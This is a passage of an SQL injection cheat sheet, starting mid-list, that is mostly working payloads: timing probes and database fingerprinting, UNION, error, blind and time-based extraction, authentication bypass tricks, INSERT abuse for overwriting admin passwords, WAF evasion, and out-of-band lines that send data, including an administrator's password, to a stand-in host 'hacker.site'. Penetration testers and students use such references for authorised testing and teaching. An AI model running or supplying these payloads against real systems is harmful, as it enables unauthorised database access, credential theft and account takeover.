')
")
`)
'))
"))
`))
```

### 2.2 Comments by DB:
```sql
MySQL:     #comment, -- comment (note space), /*comment*/, /*! MYSQL Special SQL */
PostgreSQL: --comment, /*comment*/
MSSQL:     --comment, /*comment*/
Oracle:    --comment
SQLite:    --comment, /*comment*/
HQL:       Does not support comments
```

### 2.3 Confirming with logical operations:
```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

### 2.4 Mathematical confirmation:
```
?id=1 vs ?id=2-1 (same result = SQLi)
```

### 2.5 True SQLi wordlist values:
```
true, 1, 1>0, 2-1, 0+1, 1*1, 1%2, 1 & 1, 1&&2, -1 || 1, -1 oR 1=1, 1 aND 1=1
Plus quoted variants: 1', 1'='1, 1">"0, -1'||'1'='1, etc.
Plus parenthesized variants: 1')>('0, -1')||'1'=('1, 1`)aND`1`=(`1
Plus backtick variants: 1`, 1`>`0, -1`||`1`=`1
```

================================================================================

## 3. CONFIRMING WITH TIMING

### 3.1 Sleep functions by DB:
```sql
MySQL:
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL:
1' || pg_sleep(10)

MSSQL:
1' WAITFOR DELAY '0:0:10'

Oracle:
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite:
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

### 3.2 If sleep functions blocked:
Make query perform complex operations taking seconds (DB-specific techniques).

================================================================================

## 4. IDENTIFYING BACK-END

### 4.1 Function fingerprinting:
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

================================================================================

## 5. EXPLOITING UNION BASED

### 5.1 Detect number of columns:

#### ORDER BY:
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - 3 columns
```

#### GROUP BY:
```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False
```

#### UNION SELECT null:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
Use null because type must match and null is always valid.

### 5.2 Extract database names, table names, column names:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

================================================================================

## 6. EXPLOITING HIDDEN UNION BASED

When output visible but union doesn't work directly: use blind injection to extract the backend query, then tailor payload to close original query and append UNION.

================================================================================

## 7. EXPLOITING ERROR BASED

Can see errors but not output. Use error messages to exfiltrate data:
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```

================================================================================

## 8. EXPLOITING BLIND SQLi

Can distinguish true/false responses. Dump char by char:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

### 8.1 Error Blind SQLi:
Distinguish between error/no error states:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

================================================================================

## 9. EXPLOITING TIME BASED SQLi

No way to distinguish response. Use timing side channel:
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

================================================================================

## 10. STACKED QUERIES

Execute multiple queries:
```
QUERY-1-HERE; QUERY-2-HERE
```
- Oracle: DOES NOT support
- MySQL, MSSQL, PostgreSQL: support

================================================================================

## 11. OUT OF BAND EXPLOITATION

### 11.1 DNS exfiltration:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

### 11.2 Via XXE:
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```

================================================================================

## 12. AUTOMATED EXPLOITATION

Tool: sqlmap (https://github.com/sqlmapproject/sqlmap)
Cheatsheet: SQLMap Cheatsheet in HackTricks

================================================================================

## 13. TECH-SPECIFIC INFO

Pages for: MS Access, MSSQL, MySQL, Oracle, PostgreSQL
PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

================================================================================

## 14. AUTHENTICATION BYPASS

### 14.1 Raw hash authentication bypass:
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Exploit: `md5("ffifdyop", true) = 'or'6...` → SQL injection in hash
```sql
md5("ffifdyop", true) = 'or'6]!r,b
sha1("3fDf ", true) = Qu'='@[t- o_-
```

### 14.2 Injected hash authentication bypass:
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

### 14.3 GBK Authentication Bypass:
If ' is escaped, use %A8%27 (creates 0xA80x5c0x27):
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```

### 14.4 Polyglot injection:
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

================================================================================

## 15. INSERT STATEMENT EXPLOITATION

### 15.1 Modify password of existing user:
- Create user: AdMIn (case variation)
- Create user: admin=
- SQL Truncation Attack: admin [lots of spaces] a

### 15.2 SQL Truncation Attack:
If max username length is 30, create "admin [30 spaces] a". DB checks existence → cuts to max → removes trailing spaces → updates admin's password. (Note: No longer works in latest MySQL.)

### 15.3 MySQL Insert time-based checking:
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```

### 15.4 ON DUPLICATE KEY UPDATE:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```

### 15.5 Extract information via INSERT:

#### Creating 2 accounts:
```sql
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -
```

#### Using decimal/hex (1 account):
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Decode: `__import__('binascii').unhexlify(hex(215573607263)[2:])`

#### Using hex + replace:
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```

================================================================================

## 16. ROUTED SQL INJECTION

Injectable query feeds output to another query:
```sql
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```

================================================================================

## 17. WAF BYPASS

### 17.1 No spaces bypass:
```sql
?id=1%09and%091=1%09--       (tab)
?id=1%0Dand%0D1=1%0D--       (carriage return)
?id=1%0Cand%0C1=1%0C--       (form feed)
?id=1%0Band%0B1=1%0B--       (vertical tab)
?id=1%0Aand%0A1=1%0A--       (newline)
?id=1%A0and%A01=1%A0--       (non-breaking space)
```

### 17.2 No whitespace - comments:
```sql
?id=1/*comment*/and/**/1=1/**/--
```

### 17.3 No whitespace - parenthesis:
```sql
?id=(1)and(1)=(1)--
```

### 17.4 No commas bypass:
```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### 17.5 Case bypass:
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

### 17.6 Equivalent operator bypass:
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE, REGEXP, RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING -> LIMIT X,1
```

### 17.7 Scientific Notation WAF bypass:
```sql
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

### 17.8 Bypass Column Names Restriction:

Access column by position (no name needed):
```bash
# 3rd column from 4-column table
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```

Comma bypass version:
```bash
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```

If same column count: `0 UNION SELECT * FROM flag`

### 17.9 Column/table name injection via subqueries:
```sql
-- Legit
SELECT user_name FROM vte_users WHERE id=1;
-- Injected
SELECT (SELECT token FROM vte_userauthtoken WHERE userid=1) FROM vte_users WHERE id=1;
```

### 17.10 SQLi via AST/filter-to-SQL converters (JSON_VALUE):
```sql
JSON_VALUE(metadata, '$.department') = '' OR '1'='1'
```
Payload: `' OR '1'='1`

### 17.11 ORDER BY / identifier-based SQLi:
Prepared statements cannot bind identifiers. Unsafe pattern:
```php
$sort = $_POST['sort'];
$q = "SELECT id,item_name FROM items WHERE user_id=? ORDER BY `$sort`";
```

### 17.12 WAF bypass suggester tools:
https://github.com/m4ll0k/Atlas - Quick SQLMap Tamper Suggester

================================================================================

## 18. REFERENCES & RESOURCES

- https://sqlwiki.netspi.com/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt (brute force list)
- https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f (Hidden Union Based)
- https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/
- https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/ (Bypass column names)
- https://blog.securelayer7.net/cve-2026-22730-sql-injection-spring-ai-mariadb/
